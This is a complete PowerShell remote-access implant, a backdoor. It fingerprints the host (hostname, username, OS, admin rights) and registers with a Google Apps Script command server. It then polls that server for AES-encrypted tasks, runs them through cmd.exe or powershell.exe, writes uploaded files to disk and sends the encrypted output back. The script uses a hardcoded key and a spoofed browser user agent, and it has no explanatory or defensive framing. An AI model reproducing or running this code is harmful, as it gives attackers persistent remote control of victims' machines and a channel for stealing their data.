Add-Type -AssemblyName System.Web;
function Invoke-WebRequest20 {
    [CmdletBinding()]
    [OutputType([psobject])]
    param(
        [Parameter(Mandatory=$true,
                ValueFromPipeline=$true,
                Position=0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $URI,

        [Parameter(Mandatory=$false)]
        [String]
        $Method = 'GET',

        [Parameter(Mandatory=$false)]
        [switch]
        $UseBasicParsing = $false,

        [Parameter(Mandatory=$false)]
        [object]
        $Body,

        [Parameter(Mandatory=$false)]
        [String]
        $UserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',

        [Parameter(Mandatory=$false)]
        [String]
        $ProxyURL,

        [Parameter(Mandatory=$false)]
        [String]
        $ProxyUser,

        [Parameter(Mandatory=$false)]
        [String]
        $ProxyPassword,

        [Parameter(Mandatory=$false)]
        [Switch]
        $ProxyDefaultCredentials
    )

    # Ensure URLs contains at least an 'http' protocol:
    if (-not ($URI -match "http")) { $URI = 'http://'+$URI }
    if (($ProxyURL) -and (-not ($ProxyURL -match "http"))) { $ProxyURL = 'http://'+$ProxyURL }

    $request = [System.Net.WebRequest]::Create($URI)
    $request.Method = $Method
    $request.UserAgent = $UserAgent
    $request.ServicePoint.Expect100Continue = $false;
    $request.ProtocolVersion = [System.Net.HttpVersion]::Version11;
    $request.Accept = "*/*"

    # Proxy settings
    if ($ProxyURL) { 
        $proxy = New-Object System.Net.WebProxy
        $proxy.Address = $ProxyURL
        $request.Proxy = $proxy

        if ($ProxyDefaultCredentials) {
            $request.UseDefaultCredentials = $true
            Write-Verbose "Using default proxy credentials"
        }
        elseif ($ProxyUser) {
            $secure_password    = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force;
            $proxy.Credentials  = New-Object System.Management.Automation.PSCredential ($ProxyUser, $secure_password);

            Write-Verbose "Using $ProxyUser proxy credentials"
        }
        else { Write-Verbose "Using proxy $ProxyURL" }
    }
    if($Method -eq "POST"){
        $request.ContentType =  "application/x-www-form-urlencoded";
        $bytes = [System.Text.Encoding]::UTF8.GetBytes((($Body.GetEnumerator() | % { "$($_.Key)=$([System.Web.HttpUtility]::UrlEncode($_.Value))" }) -join '&')) 
        $request.ContentLength = $bytes.Length
        
        [System.IO.Stream] $outputStream = [System.IO.Stream]$request.GetRequestStream()
        $outputStream.Write($bytes,0,$bytes.Length)  
        $outputStream.Close()
    }
    try {
        Write-Verbose "Trying to get $URI"

        $response               = $request.GetResponse();
        $response_stream        = $response.GetResponseStream();
        $response_stream_reader = New-Object System.IO.StreamReader $response_stream;
        $response_text          = $response_stream_reader.ReadToEnd(); 
        $response_status_code   = ($response.StatusCode) -as [int]
        $response.Close()

        $out = New-Object -TypeName PSObject
        $out | Add-Member -MemberType NoteProperty -Name StatusCode -Value $response_status_code
        $out | Add-Member -MemberType NoteProperty -Name Content -Value $response_text
        $out
    }
    catch {
        $response = $_.Exception.InnerException
        $response_status_code = [int](([regex]::Match($_.Exception.InnerException,"\((?<status_code>\d{3})\)")).groups["status_code"].value)

        $out = New-Object -TypeName PSObject
        $out | Add-Member -MemberType NoteProperty -Name StatusCode -Value $response_status_code
        $out | Add-Member -MemberType NoteProperty -Name Content -Value $response
        $out
    }
}
try{
    Get-Command Invoke-WebRequest -ErrorAction Stop;
}catch{
    Set-Alias -Name Invoke-WebRequest -Value Invoke-WebRequest20 -Scope Script;
}
function Create-AesManagedObject($key, $IV) {
    
    $aesManaged           = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode      = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding   = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize   = 256
    
    if ($IV) {
        
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        
        else {
            $aesManaged.IV = $IV
        }
    }
    
    if ($key) {
        
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        
        else {
            $aesManaged.Key = $key
        }
    }
    
    $aesManaged
}
function Test-Admin 
{  
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}
function Encrypt($key, $unencryptedString) {
    
    $bytes             = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged        = Create-AesManagedObject $key
    $encryptor         = $aesManaged.CreateEncryptor()
    $encryptedData     = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt($key, $encryptedStringWithIV) {
    
    $bytes           = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV              = $bytes[0..15]
    $aesManaged      = Create-AesManagedObject $key $IV
    $decryptor       = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)

}

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()
    $p.WaitForExit()

    $res = "VALID $stdout`n$stderr"
    $res
}

$myip = (New-Object System.Net.WebClient).DownloadString('http://api.ipify.org/');
$url = "https://script.google.com/macros/s/AKfycbycf3i4YzhGtrLtW_ttACPfln3wLBM4jHtVsBheL6lAsPGt2D-nbTN_Y-NeUDYE50Y/exec?ip="+$myip;
$key  = "kBZ6HWNqiO09wDhoQM19QPMRIfksCcWND5SZOkNV2Rw="
$n    = 300
$name = ""

$hname = [System.Net.Dns]::GetHostName()
$uname = $env:username
$info = (Get-WmiObject Win32_OperatingSystem | Select Caption, ServicePackMajorVersion, OSArchitecture, Version, MUILanguages)
$type  = "p"
$regl  = ($url + "&reg=1")
$data  = @{
    name = "$hname" 
    type = "$type"
    uname = "$uname"
    os = $info.Caption
    lang = $info.MUILanguages -join ","
    admin = [int](Test-Admin)
    pid = $PID
    }
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content

$resultl = ($url + "&results=1&name=$name")
$taskl   = ($url + "&tasks=1&name=$name")

for (;;){
    
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        $task = Decrypt $key $task
        $task = $task.split()
        $flag = $task[0]
        
        if ($flag -eq "VALID"){
            
            $command = $task[1]
            $args    = $task[2..$task.Length]

            if ($command -eq "cd"){
                [System.IO.Directory]::SetCurrentDirectory([System.Environment]::ExpandEnvironmentVariables($args[0]))
                $data = @{result = ""}
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
            elseif ($command -eq "shell"){
            
                $f    = "cmd.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt $key $res
                $data = @{result = "$res"}
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

            }
            elseif ($command -eq "powershell"){
            
                $f    = "powershell.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt $key $res
                $data = @{result = "$res"}
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'

            }
            elseif ($command -eq "sleep"){

                $n    = [int]$args[0]
                $data = @{result = ""}
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
            elseif ($command -eq "upload"){
                
                $path    = [System.Environment]::ExpandEnvironmentVariables($args[0])
                $bytes   = [System.Convert]::FromBase64String($args[1])
                [io.file]::WriteAllBytes($path, $bytes)
            
                $res  = Encrypt $key "VALID uploaded $path success"
                $data    = @{result = "$res"}
                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
            elseif ($command -eq "quit"){
                exit
            }
        }

    }
    sleep -Seconds $n
}